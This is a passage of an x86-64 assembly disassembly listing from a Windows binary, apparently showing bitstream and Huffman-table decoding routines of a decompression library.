   140003bc0:	41 01 cb             	add    %ecx,%r11d
   140003bc3:	44 88 76 ff          	mov    %r14b,-0x1(%rsi)
   140003bc7:	41 83 fb 40          	cmp    $0x40,%r11d
   140003bcb:	77 2b                	ja     0x140003bf8
   140003bcd:	4c 39 e7             	cmp    %r12,%rdi
   140003bd0:	0f 82 3a ff ff ff    	jb     0x140003b10
   140003bd6:	44 89 d9             	mov    %r11d,%ecx
   140003bd9:	41 83 e3 07          	and    $0x7,%r11d
   140003bdd:	c1 e9 03             	shr    $0x3,%ecx
   140003be0:	48 29 cf             	sub    %rcx,%rdi
   140003be3:	4c 39 ee             	cmp    %r13,%rsi
   140003be6:	4c 8b 0f             	mov    (%rdi),%r9
   140003be9:	41 0f 92 c6          	setb   %r14b
   140003bed:	e9 52 ff ff ff       	jmp    0x140003b44
   140003bf2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003bf8:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003bfd:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
   140003c02:	44 8b 44 24 6c       	mov    0x6c(%rsp),%r8d
   140003c07:	48 8b bc 24 90 00 00 	mov    0x90(%rsp),%rdi
   140003c0e:	00 
   140003c0f:	41 f7 d8             	neg    %r8d
   140003c12:	41 83 e0 3f          	and    $0x3f,%r8d
   140003c16:	48 39 fe             	cmp    %rdi,%rsi
   140003c19:	73 2e                	jae    0x140003c49
   140003c1b:	48 89 fb             	mov    %rdi,%rbx
   140003c1e:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140003c23:	c4 e2 a1 f7 cf       	shlx   %r11,%rdi,%rcx
   140003c28:	c4 e2 bb f7 c9       	shrx   %r8,%rcx,%rcx
   140003c2d:	48 8d 0c 4a          	lea    (%rdx,%rcx,2),%rcx
   140003c31:	48 83 c6 01          	add    $0x1,%rsi
   140003c35:	44 0f b6 09          	movzbl (%rcx),%r9d
   140003c39:	0f b6 49 01          	movzbl 0x1(%rcx),%ecx
   140003c3d:	44 88 4e ff          	mov    %r9b,-0x1(%rsi)
   140003c41:	41 01 cb             	add    %ecx,%r11d
   140003c44:	48 39 f3             	cmp    %rsi,%rbx
   140003c47:	75 da                	jne    0x140003c23
   140003c49:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   140003c4e:	31 d2                	xor    %edx,%edx
   140003c50:	48 39 74 24 30       	cmp    %rsi,0x30(%rsp)
   140003c55:	0f 84 2a 02 00 00    	je     0x140003e85
   140003c5b:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
   140003c60:	31 c0                	xor    %eax,%eax
   140003c62:	48 39 74 24 28       	cmp    %rsi,0x28(%rsp)
   140003c67:	0f 84 09 02 00 00    	je     0x140003e76
   140003c6d:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   140003c72:	49 39 ff             	cmp    %rdi,%r15
   140003c75:	0f 85 ba f2 ff ff    	jne    0x140002f35
   140003c7b:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140003c80:	48 39 74 24 78       	cmp    %rsi,0x78(%rsp)
   140003c85:	0f 85 aa f2 ff ff    	jne    0x140002f35
   140003c8b:	31 c9                	xor    %ecx,%ecx
   140003c8d:	41 83 fa 40          	cmp    $0x40,%r10d
   140003c91:	0f 94 c1             	sete   %cl
   140003c94:	21 ca                	and    %ecx,%edx
   140003c96:	85 c2                	test   %eax,%edx
   140003c98:	0f 84 97 f2 ff ff    	je     0x140002f35
   140003c9e:	41 83 fb 40          	cmp    $0x40,%r11d
   140003ca2:	0f 85 8d f2 ff ff    	jne    0x140002f35
   140003ca8:	48 8b 94 24 f8 00 00 	mov    0xf8(%rsp),%rdx
   140003caf:	00 
   140003cb0:	e9 87 f2 ff ff       	jmp    0x140002f3c
   140003cb5:	0f 1f 00             	nopl   (%rax)
   140003cb8:	41 bc 03 00 00 00    	mov    $0x3,%r12d
   140003cbe:	e9 d4 f4 ff ff       	jmp    0x140003197
   140003cc3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003cc8:	41 bc 03 00 00 00    	mov    $0x3,%r12d
   140003cce:	e9 f0 f4 ff ff       	jmp    0x1400031c3
   140003cd3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003cd8:	0f b6 3f             	movzbl (%rdi),%edi
   140003cdb:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140003ce0:	48 8d 3d 99 e4 01 00 	lea    0x1e499(%rip),%rdi        # 0x140022180
   140003ce7:	48 63 34 97          	movslq (%rdi,%rdx,4),%rsi
   140003ceb:	48 01 fe             	add    %rdi,%rsi
   140003cee:	ff e6                	jmp    *%rsi
   140003cf0:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003cf5:	0f b6 77 06          	movzbl 0x6(%rdi),%esi
   140003cf9:	48 c1 e6 30          	shl    $0x30,%rsi
   140003cfd:	48 01 74 24 38       	add    %rsi,0x38(%rsp)
   140003d02:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003d07:	0f b6 77 05          	movzbl 0x5(%rdi),%esi
   140003d0b:	48 c1 e6 28          	shl    $0x28,%rsi
   140003d0f:	48 01 74 24 38       	add    %rsi,0x38(%rsp)
   140003d14:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003d19:	0f b6 77 04          	movzbl 0x4(%rdi),%esi
   140003d1d:	48 c1 e6 20          	shl    $0x20,%rsi
   140003d21:	48 01 74 24 38       	add    %rsi,0x38(%rsp)
   140003d26:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003d2b:	0f b6 77 03          	movzbl 0x3(%rdi),%esi
   140003d2f:	48 c1 e6 18          	shl    $0x18,%rsi
   140003d33:	48 01 74 24 38       	add    %rsi,0x38(%rsp)
   140003d38:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003d3d:	0f b6 77 02          	movzbl 0x2(%rdi),%esi
   140003d41:	48 c1 e6 10          	shl    $0x10,%rsi
   140003d45:	48 01 74 24 38       	add    %rsi,0x38(%rsp)
   140003d4a:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003d4f:	0f b6 77 01          	movzbl 0x1(%rdi),%esi
   140003d53:	48 c1 e6 08          	shl    $0x8,%rsi
   140003d57:	48 01 74 24 38       	add    %rsi,0x38(%rsp)
   140003d5c:	45 84 db             	test   %r11b,%r11b
   140003d5f:	0f 84 d0 f1 ff ff    	je     0x140002f35
   140003d65:	41 0f bd f3          	bsr    %r11d,%esi
   140003d69:	41 bb 09 00 00 00    	mov    $0x9,%r11d
   140003d6f:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140003d74:	41 29 d3             	sub    %edx,%r11d
   140003d77:	41 c1 e3 03          	shl    $0x3,%r11d
   140003d7b:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003d80:	41 29 f3             	sub    %esi,%r11d
   140003d83:	e9 07 f3 ff ff       	jmp    0x14000308f
   140003d88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003d8f:	00 
   140003d90:	4c 89 cb             	mov    %r9,%rbx
   140003d93:	4d 89 d1             	mov    %r10,%r9
   140003d96:	44 8b 14 24          	mov    (%rsp),%r10d
   140003d9a:	4d 89 c8             	mov    %r9,%r8
   140003d9d:	49 29 d8             	sub    %rbx,%r8
   140003da0:	44 89 c3             	mov    %r8d,%ebx
   140003da3:	41 c1 e0 03          	shl    $0x3,%r8d
   140003da7:	49 29 d9             	sub    %rbx,%r9
   140003daa:	44 29 c0             	sub    %r8d,%eax
   140003dad:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003db2:	49 8b 19             	mov    (%r9),%rbx
   140003db5:	e9 ff f9 ff ff       	jmp    0x1400037b9
   140003dba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003dc0:	41 89 cc             	mov    %ecx,%r12d
   140003dc3:	4c 89 c9             	mov    %r9,%rcx
   140003dc6:	4c 89 cb             	mov    %r9,%rbx
   140003dc9:	4c 29 e9             	sub    %r13,%rcx
   140003dcc:	41 89 c8             	mov    %ecx,%r8d
   140003dcf:	c1 e1 03             	shl    $0x3,%ecx
   140003dd2:	4c 29 c3             	sub    %r8,%rbx
   140003dd5:	41 29 cc             	sub    %ecx,%r12d
   140003dd8:	44 89 64 24 68       	mov    %r12d,0x68(%rsp)
   140003ddd:	4c 8b 23             	mov    (%rbx),%r12
   140003de0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003de5:	e9 4f fb ff ff       	jmp    0x140003939
   140003dea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003df0:	4c 89 c9             	mov    %r9,%rcx
   140003df3:	4c 29 f9             	sub    %r15,%rcx
   140003df6:	41 89 c8             	mov    %ecx,%r8d
   140003df9:	c1 e1 03             	shl    $0x3,%ecx
   140003dfc:	4d 29 c1             	sub    %r8,%r9
   140003dff:	41 29 ca             	sub    %ecx,%r10d
   140003e02:	4c 89 4c 24 10       	mov    %r9,0x10(%rsp)
   140003e07:	4d 8b 31             	mov    (%r9),%r14
   140003e0a:	e9 8e fc ff ff       	jmp    0x140003a9d
   140003e0f:	90                   	nop
   140003e10:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   140003e15:	48 89 f9             	mov    %rdi,%rcx
   140003e18:	48 29 d9             	sub    %rbx,%rcx
   140003e1b:	41 89 c8             	mov    %ecx,%r8d
   140003e1e:	c1 e1 03             	shl    $0x3,%ecx
   140003e21:	4c 29 c7             	sub    %r8,%rdi
   140003e24:	41 29 cb             	sub    %ecx,%r11d
   140003e27:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003e2c:	48 8b 3f             	mov    (%rdi),%rdi
   140003e2f:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140003e34:	e9 c9 fd ff ff       	jmp    0x140003c02
   140003e39:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140003e3e:	4c 8b 8c 24 80 00 00 	mov    0x80(%rsp),%r9
   140003e45:	00 
   140003e46:	49 39 f9             	cmp    %rdi,%r9
   140003e49:	40 0f 92 c6          	setb   %sil
   140003e4d:	48 39 cf             	cmp    %rcx,%rdi
   140003e50:	41 0f 92 c0          	setb   %r8b
   140003e54:	41 08 f0             	or     %sil,%r8b
   140003e57:	0f 85 d8 f0 ff ff    	jne    0x140002f35
   140003e5d:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   140003e64:	00 
   140003e65:	4c 89 cd             	mov    %r9,%rbp
   140003e68:	4c 39 ce             	cmp    %r9,%rsi
   140003e6b:	0f 82 c4 f0 ff ff    	jb     0x140002f35
   140003e71:	e9 0b f8 ff ff       	jmp    0x140003681
   140003e76:	31 c0                	xor    %eax,%eax
   140003e78:	83 7c 24 68 40       	cmpl   $0x40,0x68(%rsp)
   140003e7d:	0f 94 c0             	sete   %al
   140003e80:	e9 e8 fd ff ff       	jmp    0x140003c6d
   140003e85:	31 d2                	xor    %edx,%edx
   140003e87:	83 f8 40             	cmp    $0x40,%eax
   140003e8a:	0f 94 c2             	sete   %dl
   140003e8d:	e9 c9 fd ff ff       	jmp    0x140003c5b
   140003e92:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003e99:	00 00 00 00 
   140003e9d:	0f 1f 00             	nopl   (%rax)
   140003ea0:	41 57                	push   %r15
   140003ea2:	41 56                	push   %r14
   140003ea4:	41 55                	push   %r13
   140003ea6:	41 54                	push   %r12
   140003ea8:	55                   	push   %rbp
   140003ea9:	57                   	push   %rdi
   140003eaa:	56                   	push   %rsi
   140003eab:	53                   	push   %rbx
   140003eac:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140003eb1:	48 89 d5             	mov    %rdx,%rbp
   140003eb4:	4d 85 c9             	test   %r9,%r9
   140003eb7:	0f 84 93 03 00 00    	je     0x140004250
   140003ebd:	43 0f b6 44 08 ff    	movzbl -0x1(%r8,%r9,1),%eax
   140003ec3:	49 83 f9 07          	cmp    $0x7,%r9
   140003ec7:	0f 86 43 01 00 00    	jbe    0x140004010
   140003ecd:	4f 8d 4c 08 f8       	lea    -0x8(%r8,%r9,1),%r9
   140003ed2:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   140003ed9:	84 c0                	test   %al,%al
   140003edb:	0f 84 0b 03 00 00    	je     0x1400041ec
   140003ee1:	0f bd d0             	bsr    %eax,%edx
   140003ee4:	4d 8b 11             	mov    (%r9),%r10
   140003ee7:	b8 08 00 00 00       	mov    $0x8,%eax
   140003eec:	0f b6 7b 02          	movzbl 0x2(%rbx),%edi
   140003ef0:	29 d0                	sub    %edx,%eax
   140003ef2:	4c 8d 24 29          	lea    (%rcx,%rbp,1),%r12
   140003ef6:	4c 8d 5b 04          	lea    0x4(%rbx),%r11
   140003efa:	89 fb                	mov    %edi,%ebx
   140003efc:	49 8d 70 08          	lea    0x8(%r8),%rsi
   140003f00:	4d 8d 6c 24 f9       	lea    -0x7(%r12),%r13
   140003f05:	f7 db                	neg    %ebx
   140003f07:	83 e3 3f             	and    $0x3f,%ebx
   140003f0a:	e9 d4 00 00 00       	jmp    0x140003fe3
   140003f0f:	90                   	nop
   140003f10:	4d 39 c8             	cmp    %r9,%r8
   140003f13:	0f 84 07 03 00 00    	je     0x140004220
   140003f19:	89 c2                	mov    %eax,%edx
   140003f1b:	4d 89 ce             	mov    %r9,%r14
   140003f1e:	c1 ea 03             	shr    $0x3,%edx
   140003f21:	41 89 d2             	mov    %edx,%r10d
   140003f24:	4d 29 d6             	sub    %r10,%r14
   140003f27:	4d 39 c6             	cmp    %r8,%r14
   140003f2a:	0f 82 70 01 00 00    	jb     0x1400040a0
   140003f30:	4c 39 e9             	cmp    %r13,%rcx
   140003f33:	4d 8b 16             	mov    (%r14),%r10
   140003f36:	4d 89 f1             	mov    %r14,%r9
   140003f39:	41 0f 92 c7          	setb   %r15b
   140003f3d:	c1 e2 03             	shl    $0x3,%edx
   140003f40:	29 d0                	sub    %edx,%eax
   140003f42:	45 84 ff             	test   %r15b,%r15b
   140003f45:	0f 84 69 01 00 00    	je     0x1400040b4
   140003f4b:	c4 c2 f9 f7 d2       	shlx   %rax,%r10,%rdx
   140003f50:	c4 e2 e3 f7 d2       	shrx   %rbx,%rdx,%rdx
   140003f55:	49 8d 14 93          	lea    (%r11,%rdx,4),%rdx
   140003f59:	44 0f b7 32          	movzwl (%rdx),%r14d
   140003f5d:	66 44 89 31          	mov    %r14w,(%rcx)
   140003f61:	44 0f b6 72 02       	movzbl 0x2(%rdx),%r14d
   140003f66:	0f b6 52 03          	movzbl 0x3(%rdx),%edx
   140003f6a:	41 01 c6             	add    %eax,%r14d
   140003f6d:	48 01 ca             	add    %rcx,%rdx
   140003f70:	c4 c2 89 f7 c2       	shlx   %r14,%r10,%rax
   140003f75:	c4 e2 e3 f7 c0       	shrx   %rbx,%rax,%rax
   140003f7a:	49 8d 0c 83          	lea    (%r11,%rax,4),%rcx
   140003f7e:	0f b7 01             	movzwl (%rcx),%eax
   140003f81:	66 89 02             	mov    %ax,(%rdx)
   140003f84:	0f b6 41 02          	movzbl 0x2(%rcx),%eax
   140003f88:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140003f8c:	44 01 f0             	add    %r14d,%eax
   140003f8f:	48 01 ca             	add    %rcx,%rdx
   140003f92:	c4 c2 f9 f7 ca       	shlx   %rax,%r10,%rcx
   140003f97:	c4 e2 e3 f7 c9       	shrx   %rbx,%rcx,%rcx
   140003f9c:	4d 8d 34 8b          	lea    (%r11,%rcx,4),%r14
   140003fa0:	41 0f b7 0e          	movzwl (%r14),%ecx
   140003fa4:	66 89 0a             	mov    %cx,(%rdx)
   140003fa7:	41 0f b6 4e 02       	movzbl 0x2(%r14),%ecx
   140003fac:	01 c1                	add    %eax,%ecx
   140003fae:	41 0f b6 46 03       	movzbl 0x3(%r14),%eax
   140003fb3:	48 01 c2             	add    %rax,%rdx
   140003fb6:	c4 c2 f1 f7 c2       	shlx   %rcx,%r10,%rax
   140003fbb:	c4 e2 e3 f7 c0       	shrx   %rbx,%rax,%rax
   140003fc0:	4d 8d 34 83          	lea    (%r11,%rax,4),%r14
   140003fc4:	41 0f b7 06          	movzwl (%r14),%eax
   140003fc8:	66 89 02             	mov    %ax,(%rdx)
   140003fcb:	41 0f b6 46 02       	movzbl 0x2(%r14),%eax
   140003fd0:	01 c8                	add    %ecx,%eax
   140003fd2:	41 0f b6 4e 03       	movzbl 0x3(%r14),%ecx
   140003fd7:	48 01 d1             	add    %rdx,%rcx
   140003fda:	83 f8 40             	cmp    $0x40,%eax
   140003fdd:	0f 87 75 01 00 00    	ja     0x140004158
   140003fe3:	49 39 f1             	cmp    %rsi,%r9
   140003fe6:	0f 82 24 ff ff ff    	jb     0x140003f10
   140003fec:	89 c2                	mov    %eax,%edx
   140003fee:	83 e0 07             	and    $0x7,%eax
   140003ff1:	c1 ea 03             	shr    $0x3,%edx
   140003ff4:	49 29 d1             	sub    %rdx,%r9
   140003ff7:	4c 39 e9             	cmp    %r13,%rcx
   140003ffa:	4d 8b 11             	mov    (%r9),%r10
   140003ffd:	41 0f 92 c7          	setb   %r15b
   140004001:	e9 3c ff ff ff       	jmp    0x140003f42
   140004006:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000400d:	00 00 00 
   140004010:	4c 8d 1d 89 e1 01 00 	lea    0x1e189(%rip),%r11        # 0x1400221a0
   140004017:	45 0f b6 10          	movzbl (%r8),%r10d
   14000401b:	4b 63 14 8b          	movslq (%r11,%r9,4),%rdx
   14000401f:	4c 01 da             	add    %r11,%rdx
   140004022:	ff e2                	jmp    *%rdx
   140004024:	0f 1f 40 00          	nopl   0x0(%rax)
   140004028:	41 0f b6 50 06       	movzbl 0x6(%r8),%edx
   14000402d:	48 c1 e2 30          	shl    $0x30,%rdx
   140004031:	49 01 d2             	add    %rdx,%r10
   140004034:	41 0f b6 50 05       	movzbl 0x5(%r8),%edx
   140004039:	48 c1 e2 28          	shl    $0x28,%rdx
   14000403d:	49 01 d2             	add    %rdx,%r10
   140004040:	41 0f b6 50 04       	movzbl 0x4(%r8),%edx
   140004045:	48 c1 e2 20          	shl    $0x20,%rdx
   140004049:	49 01 d2             	add    %rdx,%r10
   14000404c:	41 0f b6 50 03       	movzbl 0x3(%r8),%edx
   140004051:	48 c1 e2 18          	shl    $0x18,%rdx
   140004055:	49 01 d2             	add    %rdx,%r10
   140004058:	41 0f b6 50 02       	movzbl 0x2(%r8),%edx
   14000405d:	48 c1 e2 10          	shl    $0x10,%rdx
   140004061:	49 01 d2             	add    %rdx,%r10
   140004064:	41 0f b6 50 01       	movzbl 0x1(%r8),%edx
   140004069:	48 c1 e2 08          	shl    $0x8,%rdx
   14000406d:	49 01 d2             	add    %rdx,%r10
   140004070:	84 c0                	test   %al,%al
   140004072:	0f 84 6d 01 00 00    	je     0x1400041e5
   140004078:	0f bd d0             	bsr    %eax,%edx
   14000407b:	b8 09 00 00 00       	mov    $0x9,%eax
   140004080:	0f b6 7b 02          	movzbl 0x2(%rbx),%edi
   140004084:	4c 8d 24 29          	lea    (%rcx,%rbp,1),%r12
   140004088:	44 29 c8             	sub    %r9d,%eax
   14000408b:	4c 8d 5b 04          	lea    0x4(%rbx),%r11
   14000408f:	4d 89 c1             	mov    %r8,%r9
   140004092:	c1 e0 03             	shl    $0x3,%eax
   140004095:	29 d0                	sub    %edx,%eax
   140004097:	e9 5e fe ff ff       	jmp    0x140003efa
   14000409c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400040a0:	4c 89 ca             	mov    %r9,%rdx
   1400040a3:	4c 29 c2             	sub    %r8,%rdx
   1400040a6:	41 89 d2             	mov    %edx,%r10d
   1400040a9:	c1 e2 03             	shl    $0x3,%edx
   1400040ac:	4d 29 d1             	sub    %r10,%r9
   1400040af:	29 d0                	sub    %edx,%eax
   1400040b1:	4d 8b 11             	mov    (%r9),%r10
   1400040b4:	49 8d 5c 24 fe       	lea    -0x2(%r12),%rbx
   1400040b9:	83 f8 40             	cmp    $0x40,%eax
   1400040bc:	0f 87 9b 00 00 00    	ja     0x14000415d
   1400040c2:	41 89 fd             	mov    %edi,%r13d
   1400040c5:	41 f7 dd             	neg    %r13d
   1400040c8:	41 83 e5 3f          	and    $0x3f,%r13d
   1400040cc:	eb 67                	jmp    0x140004135
   1400040ce:	66 90                	xchg   %ax,%ax
   1400040d0:	4d 39 c8             	cmp    %r9,%r8
   1400040d3:	0f 84 3b 01 00 00    	je     0x140004214
   1400040d9:	89 c2                	mov    %eax,%edx
   1400040db:	4d 89 ce             	mov    %r9,%r14
   1400040de:	c1 ea 03             	shr    $0x3,%edx
   1400040e1:	41 89 d2             	mov    %edx,%r10d
   1400040e4:	4d 29 d6             	sub    %r10,%r14
   1400040e7:	4d 39 c6             	cmp    %r8,%r14
   1400040ea:	0f 82 10 01 00 00    	jb     0x140004200
   1400040f0:	48 39 cb             	cmp    %rcx,%rbx
   1400040f3:	4d 8b 16             	mov    (%r14),%r10
   1400040f6:	4d 89 f1             	mov    %r14,%r9
   1400040f9:	41 0f 93 c7          	setae  %r15b
   1400040fd:	c1 e2 03             	shl    $0x3,%edx
   140004100:	29 d0                	sub    %edx,%eax
   140004102:	45 84 ff             	test   %r15b,%r15b
   140004105:	0f 84 09 01 00 00    	je     0x140004214
   14000410b:	c4 c2 f9 f7 d2       	shlx   %rax,%r10,%rdx
   140004110:	c4 e2 93 f7 d2       	shrx   %r13,%rdx,%rdx
   140004115:	49 8d 14 93          	lea    (%r11,%rdx,4),%rdx
   140004119:	44 0f b7 32          	movzwl (%rdx),%r14d
   14000411d:	66 44 89 31          	mov    %r14w,(%rcx)
   140004121:	44 0f b6 72 02       	movzbl 0x2(%rdx),%r14d
   140004126:	0f b6 52 03          	movzbl 0x3(%rdx),%edx
   14000412a:	44 01 f0             	add    %r14d,%eax
   14000412d:	48 01 d1             	add    %rdx,%rcx
   140004130:	83 f8 40             	cmp    $0x40,%eax
   140004133:	77 28                	ja     0x14000415d
   140004135:	49 39 f1             	cmp    %rsi,%r9
   140004138:	72 96                	jb     0x1400040d0
   14000413a:	89 c2                	mov    %eax,%edx
   14000413c:	83 e0 07             	and    $0x7,%eax
   14000413f:	c1 ea 03             	shr    $0x3,%edx
   140004142:	49 29 d1             	sub    %rdx,%r9
   140004145:	48 39 cb             	cmp    %rcx,%rbx
   140004148:	4d 8b 11             	mov    (%r9),%r10
   14000414b:	41 0f 93 c7          	setae  %r15b
   14000414f:	eb b1                	jmp    0x140004102
   140004151:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004158:	49 8d 5c 24 fe       	lea    -0x2(%r12),%rbx
   14000415d:	48 39 cb             	cmp    %rcx,%rbx
   140004160:	0f 82 1a 01 00 00    	jb     0x140004280
   140004166:	89 fe                	mov    %edi,%esi
   140004168:	f7 de                	neg    %esi
   14000416a:	83 e6 3f             	and    $0x3f,%esi
   14000416d:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004174:	00 00 00 00 
   140004178:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000417f:	00 
   140004180:	c4 c2 f9 f7 d2       	shlx   %rax,%r10,%rdx
   140004185:	c4 e2 cb f7 d2       	shrx   %rsi,%rdx,%rdx
   14000418a:	49 8d 14 93          	lea    (%r11,%rdx,4),%rdx
   14000418e:	44 0f b7 2a          	movzwl (%rdx),%r13d
   140004192:	66 44 89 29          	mov    %r13w,(%rcx)
   140004196:	44 0f b6 6a 02       	movzbl 0x2(%rdx),%r13d
   14000419b:	0f b6 52 03          	movzbl 0x3(%rdx),%edx
   14000419f:	44 01 e8             	add    %r13d,%eax
   1400041a2:	48 01 d1             	add    %rdx,%rcx
   1400041a5:	48 39 cb             	cmp    %rcx,%rbx
   1400041a8:	73 d6                	jae    0x140004180
   1400041aa:	4c 39 e1             	cmp    %r12,%rcx
   1400041ad:	73 31                	jae    0x1400041e0
   1400041af:	f7 df                	neg    %edi
   1400041b1:	c4 42 f9 f7 d2       	shlx   %rax,%r10,%r10
   1400041b6:	c4 42 c3 f7 d2       	shrx   %rdi,%r10,%r10
   1400041bb:	4b 8d 14 93          	lea    (%r11,%r10,4),%rdx
   1400041bf:	44 0f b6 12          	movzbl (%rdx),%r10d
   1400041c3:	44 88 11             	mov    %r10b,(%rcx)
   1400041c6:	80 7a 03 01          	cmpb   $0x1,0x3(%rdx)
   1400041ca:	0f 84 a0 00 00 00    	je     0x140004270
   1400041d0:	83 f8 3f             	cmp    $0x3f,%eax
   1400041d3:	76 5b                	jbe    0x140004230
   1400041d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400041dc:	00 00 00 00 
   1400041e0:	4d 39 c8             	cmp    %r9,%r8
   1400041e3:	74 63                	je     0x140004248
   1400041e5:	48 c7 c2 ec ff ff ff 	mov    $0xffffffffffffffec,%rdx
   1400041ec:	48 89 d0             	mov    %rdx,%rax
   1400041ef:	5b                   	pop    %rbx
   1400041f0:	5e                   	pop    %rsi
   1400041f1:	5f                   	pop    %rdi
   1400041f2:	5d                   	pop    %rbp
   1400041f3:	41 5c                	pop    %r12
   1400041f5:	41 5d                	pop    %r13
   1400041f7:	41 5e                	pop    %r14
   1400041f9:	41 5f                	pop    %r15
   1400041fb:	c3                   	ret
   1400041fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140004200:	4c 89 ca             	mov    %r9,%rdx
   140004203:	4c 29 c2             	sub    %r8,%rdx
   140004206:	41 89 d2             	mov    %edx,%r10d
   140004209:	c1 e2 03             	shl    $0x3,%edx
   14000420c:	4d 29 d1             	sub    %r10,%r9
   14000420f:	29 d0                	sub    %edx,%eax
   140004211:	4d 8b 11             	mov    (%r9),%r10
   140004214:	48 39 cb             	cmp    %rcx,%rbx
   140004217:	0f 83 49 ff ff ff    	jae    0x140004166
   14000421d:	eb 8b                	jmp    0x1400041aa
   14000421f:	90                   	nop
   140004220:	49 8d 5c 24 fe       	lea    -0x2(%r12),%rbx
   140004225:	e9 98 fe ff ff       	jmp    0x1400040c2
   14000422a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004230:	0f b6 52 02          	movzbl 0x2(%rdx),%edx
   140004234:	01 d0                	add    %edx,%eax
   140004236:	83 f8 40             	cmp    $0x40,%eax
   140004239:	76 a5                	jbe    0x1400041e0
   14000423b:	4d 39 c8             	cmp    %r9,%r8
   14000423e:	75 a5                	jne    0x1400041e5
   140004240:	48 89 ea             	mov    %rbp,%rdx
   140004243:	eb a7                	jmp    0x1400041ec
   140004245:	0f 1f 00             	nopl   (%rax)
   140004248:	83 f8 40             	cmp    $0x40,%eax
   14000424b:	75 98                	jne    0x1400041e5
   14000424d:	eb f1                	jmp    0x140004240
   14000424f:	90                   	nop
   140004250:	48 c7 c2 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rdx
   140004257:	48 89 d0             	mov    %rdx,%rax
   14000425a:	5b                   	pop    %rbx
   14000425b:	5e                   	pop    %rsi
   14000425c:	5f                   	pop    %rdi
   14000425d:	5d                   	pop    %rbp
   14000425e:	41 5c                	pop    %r12
   140004260:	41 5d                	pop    %r13
   140004262:	41 5e                	pop    %r14
   140004264:	41 5f                	pop    %r15
   140004266:	c3                   	ret
   140004267:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000426e:	00 00 
   140004270:	0f b6 52 02          	movzbl 0x2(%rdx),%edx
   140004274:	01 d0                	add    %edx,%eax
   140004276:	e9 65 ff ff ff       	jmp    0x1400041e0
   14000427b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004280:	4c 39 e1             	cmp    %r12,%rcx
   140004283:	0f 82 26 ff ff ff    	jb     0x1400041af
   140004289:	e9 57 ff ff ff       	jmp    0x1400041e5
   14000428e:	66 90                	xchg   %ax,%ax
   140004290:	41 57                	push   %r15
   140004292:	41 56                	push   %r14
   140004294:	41 55                	push   %r13
   140004296:	41 54                	push   %r12
   140004298:	55                   	push   %rbp
   140004299:	57                   	push   %rdi
   14000429a:	56                   	push   %rsi
   14000429b:	53                   	push   %rbx
   14000429c:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
   1400042a3:	48 89 c8             	mov    %rcx,%rax
   1400042a6:	48 89 94 24 08 01 00 	mov    %rdx,0x108(%rsp)
   1400042ad:	00 
   1400042ae:	48 c7 c1 ec ff ff ff 	mov    $0xffffffffffffffec,%rcx
   1400042b5:	49 83 f9 09          	cmp    $0x9,%r9
   1400042b9:	76 34                	jbe    0x1400042ef
   1400042bb:	41 0f b7 38          	movzwl (%r8),%edi
   1400042bf:	41 0f b7 68 02       	movzwl 0x2(%r8),%ebp
   1400042c4:	4d 89 ca             	mov    %r9,%r10
   1400042c7:	45 0f b7 58 04       	movzwl 0x4(%r8),%r11d
   1400042cc:	48 8d 14 2f          	lea    (%rdi,%rbp,1),%rdx
   1400042d0:	49 89 fd             	mov    %rdi,%r13
   1400042d3:	49 89 ec             	mov    %rbp,%r12
   1400042d6:	49 29 d2             	sub    %rdx,%r10
   1400042d9:	4c 89 db             	mov    %r11,%rbx
   1400042dc:	4d 29 da             	sub    %r11,%r10
   1400042df:	49 8d 4a fa          	lea    -0x6(%r10),%rcx
   1400042e3:	49 39 c9             	cmp    %rcx,%r9
   1400042e6:	73 28                	jae    0x140004310
   1400042e8:	48 c7 c1 ec ff ff ff 	mov    $0xffffffffffffffec,%rcx
   1400042ef:	48 89 c8             	mov    %rcx,%rax
